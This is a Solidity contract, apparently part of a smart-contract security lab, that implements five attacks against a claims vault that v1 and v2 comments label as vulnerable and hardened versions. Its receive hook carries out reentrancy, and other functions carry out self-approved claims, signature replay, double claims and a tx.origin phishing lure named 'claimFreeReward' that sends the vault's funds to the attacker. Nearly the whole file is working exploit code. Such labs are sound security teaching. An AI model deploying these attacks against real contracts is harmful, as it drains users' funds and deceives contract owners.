// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function fileClaim(uint256 amount, bytes32 incidentId) external returns (uint256);
    function approveClaim(uint256 id) external;
    function claim(uint256 id) external;
    function payWithSignature(uint256 id, bytes calldata sig) external;
    function emergencyWithdraw(address payable to) external;
}

/// @title AttackerContract (the red team)
/// @notice One function per attack. Works against BOTH vault versions.
contract AttackerContract {
    IVault public immutable vault;
    address payable public immutable attacker;

    bool private reentering;
    uint256 private targetId;
    uint256 private reenterAmount;
    uint256 public firstId;
    uint256 public secondId;

    event AttackStarted(string name);

    constructor(address _vault) {
        vault = IVault(_vault);
        attacker = payable(msg.sender);
    }

    // Runs every time this contract RECEIVES money.
    // This is what makes reentrancy possible.
    receive() external payable {
        if (reentering && address(vault).balance >= reenterAmount) {
            vault.claim(targetId); // shout "give me cash again!"
        }
    }

    // A normal, honest claim (used as the starting point of some attacks)
    function fileLegitClaim(uint256 amount, bytes32 incidentId) external returns (uint256 id) {
        id = vault.fileClaim(amount, incidentId);
        reenterAmount = amount;
    }

    // Attack 1: Reentrancy
    function attackReentrancy(uint256 id) external {
        emit AttackStarted("reentrancy");
        targetId = id;
        reentering = true;
        vault.claim(id);
        reentering = false;
    }

    // Attack 2: Access control bypass (approve my own fake claim)
    function attackAccessBypass(uint256 amount, bytes32 incidentId) external {
        emit AttackStarted("access-bypass");
        uint256 id = vault.fileClaim(amount, incidentId);
        vault.approveClaim(id); // v1 allows this, v2 must revert
        vault.claim(id);
    }

    // Attack 3: Signature replay (reuse one valid signature many times)
    function attackReplay(uint256 id, bytes calldata sig, uint256 times) external {
        emit AttackStarted("signature-replay");
        for (uint256 i = 0; i < times; i++) {
            vault.payWithSignature(id, sig);
        }
    }

    // Attack 4: Double claim (same incident filed twice)
    function fileTwice(uint256 amount, bytes32 incidentId) external {
        emit AttackStarted("double-claim");
        firstId = vault.fileClaim(amount, incidentId);
        secondId = vault.fileClaim(amount, incidentId); // v2 must revert here
    }

    function attackDoubleClaim() external {
        vault.claim(firstId);
        vault.claim(secondId);
    }

    // Attack 5: tx.origin phishing (looks like a free reward to the owner)
    function claimFreeReward() external {
        emit AttackStarted("tx-origin");
        vault.emergencyWithdraw(attacker);
    }

    function sweep() external {
        require(msg.sender == attacker, "not attacker");
        (bool ok, ) = attacker.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}